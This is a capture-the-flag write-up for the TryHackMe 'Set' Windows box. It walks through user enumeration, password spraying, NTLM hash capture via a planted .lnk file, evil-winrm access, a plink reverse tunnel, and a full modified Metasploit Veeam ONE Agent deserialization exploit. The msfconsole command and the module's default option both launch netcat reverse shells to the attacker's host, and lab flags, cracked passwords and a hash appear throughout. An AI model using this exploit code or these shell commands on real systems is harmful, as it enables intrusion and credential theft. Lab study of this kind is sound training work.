###  TRYHACKME

##   Set


##  Thanks to the TryHackMe creators:  @4nqr34z and @theart42 


---


![nmap](/home/kali/Pictures/SETH/nmap.png)


---


PORT 80 and 443 show the same site:


We have a    contact@windcorp.thm  


And possible users?


Max Douglas				Chief Executive Officer
Marjorie Adams			Product Manager
Nathaniel Martin		CTO
Roberta Phillips		Accountant

max.d
marjorie.a
nathaniel.m
roberta.p


---


AHA, there is a 'Search' field at the bottom where we can look for users:



Name: a


Name		Phone		Email
Aaron 		Wheeler		9553310397	aaronwhe@windcorp.thm

Becky 		Welch	    9491169020	beckywel@windcorp.thm
...
snip 



Only one search item shows up for each initial letter. There must be more than one, no? We need to find the search method.


---


view-source:https://set.windcorp.thm/assets/js/search.js

```
function searchFor() {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      myFunction(this);
    }
  };
  xmlhttp.open("GET", "assets/data/users.xml" , true);
  xmlhttp.send();
}



function myFunction(xml) {
    xmlDoc = xml.responseXML;
    x = xmlDoc.getElementsByTagName("row");
    input = document.getElementById("input").value;
    size = input.length;
    if (input == null || input == "")
    {
        document.getElementById("results").innerHTML= "Please enter a character or name!";
        return false;
    }
    for (i=0;i<x.length;i++)
    {
	name = xmlDoc.getElementsByTagName("name")[i].childNodes[0].nodeValue;
        startString = name.substring(0,size);
 	console.log(input)
        if (startString.toLowerCase() == input.toLowerCase())
 	
	
        {
            name = xmlDoc.getElementsByTagName("name")[i].childNodes[0].nodeValue;
            phone = xmlDoc.getElementsByTagName("phone")[i].childNodes[0].nodeValue;
            email = xmlDoc.getElementsByTagName("email")[i].childNodes[0].nodeValue;
            divText = "<table border=1><tr><th>Name</th><th>Phone</th><th>Email</th></tr>" + "<tr><td>" + name + "</td><td>" + phone + "</td><td>" + email + "</td></tr>" + "</table>";
           
	    break;
        }
        else
        {
            divText = "<h2>The contact does not exist.</h2>";
        }
    }
    document.getElementById("results").innerHTML= divText;
}
```

IMPORTANT:  /assets/data/users.xml


https://set.windcorp.thm/assets/data/users.xml


 Aaron Wheeler 9553310397 aaronwhe@windcorp.thm 
 Addison Russell 9425499327 addisonrus@windcorp.thm 
 Aiden Boyd 9755649273 aidenboy@windcorp.thm 
 Alice Peterson 9148366317 alicepet@windcorp.thm 
 Allison Neal 9828994495 allisonnea@windcorp.thm 
 Alyssa Baker 9163027451 alyssabak@windcorp.thm 
 Andrea Curtis 9755196728 andreacur@windcorp.thm 
 Andrea Harper 9585111671 andreahar@windcorp.thm 
 Andrea Stephens 9558590271 andreaste@windcorp.thm 
 Andrew Powell 9390415125 andrewpow@windcorp.thm 
 Aubree Hopkins 9632339125 aubreehop@windcorp.thm 
 Becky Welch 9491169020 beckywel@windcorp.thm 
 Bernard Mckinney 9479040114 bernardmck@windcorp.thm 
 Billie Hill 9246421411 billiehil@windcorp.thm 
 Billie Ryan 9366649525 billierya@windcorp.thm 
 Brandon Spencer 9410685652 brandonspe@windcorp.thm 
 Brandy Rodriguez 9185936482 brandyrod@windcorp.thm 
 Brayden Hawkins 9744517297 braydenhaw@windcorp.thm 
 Brayden Webb 9077893600 braydenweb@windcorp.thm 
 Byron Wilson 9086090764 byronwil@windcorp.thm 
 Caleb Rodriquez 9750362178 calebrod@windcorp.thm 
 Chloe West 9323971290 chloewes@windcorp.thm 
 Christine Ruiz 9773238242 christinerui@windcorp.thm 
 Claire Hayes 9533960519 clairehay@windcorp.thm 
 Craig Mcdonalid 9649854140 craigmcd@windcorp.thm 
 Dana Ross 9372163120 danaros@windcorp.thm 
 Danielle Thompson 9265723462 danielletho@windcorp.thm 
 Darrell Pearson 9064618951 darrellpea@windcorp.thm 
 Don Burns 9173623900 donbur@windcorp.thm 
 Don Perkins 9084074065 donper@windcorp.thm 
 Edna Howard 9255976264 ednahow@windcorp.thm 
 Edna Perez 9751554551 ednaper@windcorp.thm 
 Edna Reyes 9678550070 ednarey@windcorp.thm 
 Eugene Woods 9776913157 eugenewoo@windcorp.thm 
 Fernando Hunter 9477053681 fernandohun@windcorp.thm 
 Flenn Rodriguez 9620223505 flennrod@windcorp.thm 
 Floyd Peters 9657958662 floydpet@windcorp.thm 
 Gabriel Allen 9643943457 gabrielall@windcorp.thm 
 Gertrude Willis 9660380139 gertrudewil@windcorp.thm 
 Gilbert Taylor 9497814296 gilberttay@windcorp.thm 
 Glenda Snyder 9645249612 glendasny@windcorp.thm 
 Gordon Banks 9221587791 gordonban@windcorp.thm 
 Harvey Reyes 9603908632 harveyrey@windcorp.thm 
 Heidi Watkins 9451278553 heidiwat@windcorp.thm 
 Herminia Cole 9581431204 herminiacol@windcorp.thm 
 Holly Welch 9443104181 hollywel@windcorp.thm 
 Hugh Foster 9526447818 hughfos@windcorp.thm 
 Ivan Ray 9677923384 ivanray@windcorp.thm 
 Jamie Grant 9387534835 jamiegra@windcorp.thm 
 Janice Kim 9067442150 janicekim@windcorp.thm 
 Jason Perez 9642625687 jasonper@windcorp.thm 
 Jayden Hunter 9508507439 jaydenhun@windcorp.thm 
 Jill Beck 9638187838 jillbec@windcorp.thm 
 Jimmie Barnes 9795018610 jimmiebar@windcorp.thm 
 Jimmy Porter 9350381314 jimmypor@windcorp.thm 
 Jose Byrd 9325177477 josebyr@windcorp.thm 
 Juanita Ramirez 9288815642 juanitaram@windcorp.thm 
 Julio Craig 9254762120 juliocra@windcorp.thm 
 Kay Hart 9796208755 kayhar@windcorp.thm 
 Kelly Jennings 9272193146 kellyjen@windcorp.thm 
 Kitty Martinez 9344181558 kittymar@windcorp.thm 
 Kristin Freeman 9671862624 kristinfre@windcorp.thm 
 Leah Burns 9370945493 leahbur@windcorp.thm 
 Leah Larson 9405192106 leahlar@windcorp.thm 
 Lena Moore 9152306286 lenamoo@windcorp.thm 
 Lesa Rogers 9117277093 lesarog@windcorp.thm 
 Mae Gutierrez 9248353873 maegut@windcorp.thm 
 Marjorie Adams 9815544674 marjorieada@windcorp.thm 
 Mason Morgan 9763900674 masonmor@windcorp.thm 
 Max Douglas 9059976510 maxdou@windcorp.thm 
 Meghan Chavez 9343149282 meghancha@windcorp.thm 
 Meghan Holmes 9411201102 meghanhol@windcorp.thm 
 Michelle Watson 9403324436 michellewat@windcorp.thm 
 Miriam Warren 9169665651 miriamwar@windcorp.thm 
 Myrtle Owens 9236359982 myrtleowe@windcorp.thm 
 Natalie Armstrong 9139014812 nataliearm@windcorp.thm 
 Natalie Pena 9065067491 nataliepen@windcorp.thm 
 Nathaniel Martin 9238715241 nathanielmar@windcorp.thm 
 Nicholas Ramos 9195528448 nicholasram@windcorp.thm 
 Norman Andrews 9627928079 normanand@windcorp.thm 
 Norman Turner 9686217917 normantur@windcorp.thm 
 Owen Kelly 9634333042 owenkel@windcorp.thm 
 Pamela Green 9591861259 pamelagre@windcorp.thm 
 Peggy Hale 9516199316 peggyhal@windcorp.thm 
 Penny Ray 9601193921 pennyray@windcorp.thm 
 Peyton James 9418203135 peytonjam@windcorp.thm 
 Phyllis Richards 9544834180 phyllisric@windcorp.thm 
 Priscilla Newman 9713581149 priscillanew@windcorp.thm 
 Randy Gregory 9852579096 randygre@windcorp.thm 
 Renee Lucas 9427221487 reneeluc@windcorp.thm 
 Ricky Reed 9759905687 rickyree@windcorp.thm 
 Roberta Phillips 9684559579 robertaphi@windcorp.thm 
 Rodney Henderson 9754448044 rodneyhen@windcorp.thm 
 Roger Meyer 9083492998 rogermey@windcorp.thm 
 Rosemary West 9591024361 rosemarywes@windcorp.thm 
 Rose Newman 9205410994 rosenew@windcorp.thm 
 Ross Powell 9760873338 rosspow@windcorp.thm 
 Roy Mason 9471743184 roymas@windcorp.thm 
 Ruben Schmidt 9841777068 rubensch@windcorp.thm 
 Sally Hanson 9727402503 sallyhan@windcorp.thm 
 Sally Ortiz 9097609430 sallyort@windcorp.thm 
 Sally Stevens 9253372851 sallyste@windcorp.thm 
 Salvador Lee 9721790593 salvadorlee@windcorp.thm 
 Seth Hicks 9256479847 sethhic@windcorp.thm 
 Soham Kelly 9267003653 sohamkel@windcorp.thm 
 Soham Tucker 9748199456 sohamtuc@windcorp.thm 
 Sophia Boyd 9533303011 sophiaboy@windcorp.thm 
 Stephanie Reyes 9315764608 stephanierey@windcorp.thm 
 Susan Stanley 9418418338 susansta@windcorp.thm 
 Tammy Johnson 9483189047 tammyjoh@windcorp.thm 
 Thomas Webb 9084052439 thomasweb@windcorp.thm 
 Tom Andrews 9696995894 tomand@windcorp.thm 
 Vera Nichols 9751374913 veranic@windcorp.thm 
 Vivan Garrett 9167843402 vivangar@windcorp.thm 
 Wade Reynolds 9660112276 waderey@windcorp.thm 
 Walter Palmer 9849809395 walterpal@windcorp.thm 
 Wayne Woods 9597191398 waynewoo@windcorp.thm 
 Wendy Robinson 9078070221 wendyrob@windcorp.thm 
 Wyatt Wheeler 9680869094 wyattwhe@windcorp.thm 
 Zack Sullivan 9457576007 zacksul@windcorp.thm 



##  Break this list down by email usernames alone to create a users.txt


---


More recon needed:


![appnotes](/home/kali/Pictures/SETH/appnotes.png)


https://set.windcorp.thm/appnotes.txt


Notes for the new user-module.

Send mail to user:

Welcome to Set!

Remember to change your default password at once. It is too common.


##  THAT is KEY. 'Common' is a clue to use a list of common passwords. So, we should first try 'top-20-common-SSH-passwords.txt'



---


![nxc-smb](/home/kali/Pictures/SETH/nxc-smb.png)


username:  			myrtleowe
password:			Passw@rd


---


![info-txt](/home/kali/Pictures/SETH/info-txt.png)


cat Info.txt  

Zip and save your project files here. 
We will review them

BTW.
Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}


---


We need to attack this smb connection by uploading a zip file that hides a forced callback .lnk script that calls back to OUR machine so we can grab the NTLM hash


There is a program called mslink  here  https://www.mamachine.org/mslink/index.en.html   (grab the bash version for Linux and make sure to use your tun0 address for the call back)


![mslink](/home/kali/Pictures/SETH/mslink.png)


---

Fire up RESPONDER and then go place the zip file on the SMB server 


![myzipfile](/home/kali/Pictures/SETH/myzipfile.png)


Wait a few seconds and ...


![responder](/home/kali/Pictures/SETH/responder.png)



[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:d9086b60e4a82cb5:A808BC879922103E44D9ACDB41177A3A:01010000000000000054ACFE4E47DC01A272EE4EE21938BD0000000002000800340034003400500001001E00570049004E002D003900500038005700430041005400550036004100300004003400570049004E002D00390050003800570043004100540055003600410030002E0034003400340050002E004C004F00430041004C000300140034003400340050002E004C004F00430041004C000500140034003400340050002E004C004F00430041004C00070008000054ACFE4E47DC0106000400020000000800300030000000000000000000000000200000568C6D8677F297F3883242998396990C2231208E39B3D36D12BE8AB7ED532FF30A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310033002E00340035002E003200320037000000000000000000 


---


#  Now crack the hash to grab the password for 'MichelleWat'


![john](/home/kali/Pictures/SETH/john.png)


username:		MichelleWat
password:		!!!MICKEYmouse


---


Now we can log in with evil-winrm


![evil-winrm](/home/kali/Pictures/SETH/evil-winrm.png)


Flag2:  THM{690798b1780964f5f51cebd854da5a2ea236ebb5}


---


#  Need to look around and find something as we are blocked from uploading files at the moment:


![netstat-ao](/home/kali/Pictures/SETH/netstat-ao.png)


#  Now, we need to find out what the heck is running on that port. Use the PID and 'Get-Process -Id <PID>'


	*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> Get-Process -Id 4660

	Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
	-------  ------    -----      -----     ------     --  -- -----------
	    756      53    53708      73384              4660   0 Veeam.One.Agent.Service



We can go to the proper directory and look up the version:

![veeam-version](/home/kali/Pictures/SETH/veeam-version.png)

---


Check Metasploit for any VEEAM ONE AGENT exploit.

Name: Veeam ONE Agent .NET Deserialization
Module: exploit/windows/misc/veeam_one_agent_deserialization
Source code: modules/exploits/windows/misc/veeam_one_agent_deserialization.rb
Disclosure date: 2020-04-15
Last modification time: 2021-02-16 13:56:50 +0000
Supported architecture(s): cmd, x86, x64
Supported platform(s): Windows
Target service / protocol: -
Target network port(s): 2805
List of CVEs: CVE-2020-10914, CVE-2020-10915

This module exploits a .NET deserialization vulnerability in the Veeam ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the 9 and 10 release lines. Specifically, the module targets the HandshakeResult() method used by the Agent. By inducing a failure in the handshake, the Agent will deserialize untrusted data. Tested against the pre-patched release of 10.0.0.750. Note that Veeam continues to distribute this version but with the patch pre-applied.


---


#  So, our version is EXPLOITABLE!!!


We need to get something on the box that allows us to communicate with that port, like plink.exe??  Which version?


![system-info](/home/kali/Pictures/SETH/system-info.png)


Ok, 64-bit.  Go here and grab the 64-bit version of plink.exe:


https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html


---


FIRST, we need to start our SSH service so that plink.exe has something to talk to:


-> sudo service ssh start


Put plink.exe on the target and run:


Evil-WinRM PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri "http://10.13.45.227/plink.exe" -outfile "plink.exe"


Then set it up as a Reverse proxy to port 2805 so we can access that port:


![plink](/home/kali/Pictures/SETH/plink.png)


.\plink.exe -ssh -batch -hostkey "ssh-ed25519 255 SHA256:8CwsEEIlBI8RAddOOZfoOSSOC7uQ55el5KqnTdhwqxM" -l hacker -pw s3cr3t -N -R 2805:127.0.0.1:2805 10.13.45.227


---


It will hang. Test to see if it is working using nmap:


![local-nmap](/home/kali/Pictures/SETH/local-nmap.png)


---


Set this up in one terminal:


![smbserver](/home/kali/Pictures/SETH/smbserver.png)

`pkill -f smbserver.py || true; smbserver.py -smb2support -debug -username me -password me myshare .`


Set up a listener in another terminal:


![pwncat](/home/kali/Pictures/SETH/pwncat.png)


`pwncat-qui -m windows  -lp 4444` 


---


Now, we can set up and use a modified METASPLOIT  VEEAM ONE AGENT exploit module. 


This was actually fairly nasty to set up:  I will give the full code of my modified metasploit ruby file so I don't have to explain the small changes in detail. Save it as '/usr/share/metasploit-framework/modules/exploits/windows/misc/veeam_one_agent_deserialization_mod.rb'


`
class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam ONE Agent .NET Deserialization',
        'Description' => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
          continues to distribute this version but with the patch pre-applied.
        },
        'Author' => [
          'Michael Zanetta', # Discovery
          'Edgar Boda-Majer', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-10914'],
          ['CVE', '2020-10915'], # This module
          ['ZDI', '20-545'],
          ['ZDI', '20-546'], # This module
          ['URL', 'https://www.veeam.com/kb3144']
        ],
        'DisclosureDate' => '2020-04-15', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
                    [
            'Windows Custom Command',
            {
              'Arch' => [ARCH_CMD, ARCH_X64],
              'Type' => :win_cmd1,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/exec'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 2,
        'DefaultOptions' => {
          'WfsDelay' => 10
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        'CMD',
        [
          true,
          'Command to be executed on target',
          'nc.exe 10.10.10.10 1234 -e powershell'
        ]
        ),
        OptString.new(
        'HOSTINFO_NAME',
        [
          true,
          'Name to send in host info (must be recognized by server!)',
          'AgentController'
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore['HOSTINFO_NAME']))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd1
      execute_command(datastore['CMD'])
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It's over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack('v')
    packed_name = [name.length].pack('C') + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack('l<')

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack('VvVV')
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end

end
`


---


Then, you need to run 'updatedb' on your Kali machine!! If you don't do this the module might not get taken up into Metasploit

Next, run 'reload_all' inside of msfconsole to grab the new module. 


---


#  Finally, we need to create the correct Metasploit command to get the exploit running. This was the most difficult part for me. 


For some reason the other writeups don't include the ACTUAL command that works. 

The command can be run inside of msfconsole OR outside --->  I chose outside just so I could modify and run things over and over again without slowly loading msfconsole and typing everything in each time


![msfconsole-command](/home/kali/Pictures/SETH/msfconsole-command.png)


`msfconsole -q -x "use exploit/windows/misc/veeam_one_agent_deserialization_mod; set RHOSTS 127.0.0.1; set RPORT 2805; set PAYLOAD windows/x64/exec; set CMD cmd.exe /c \"net use a: \\\\\\\\10.13.45.227\\\\myshare /user:me me && a:\\\\nc64.exe 10.13.45.227 4444 -e cmd\"; set target 2; exploit; exit"`


---


#  We see the smbserver get hit:


![connection](/home/kali/Pictures/SETH/connection.png)


And after some small period of time:


![system](/home/kali/Pictures/SETH/system.png)


BOOM!! 

Finally! Haha :)



![flag3](/home/kali/Pictures/SETH/flag3.png)



Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}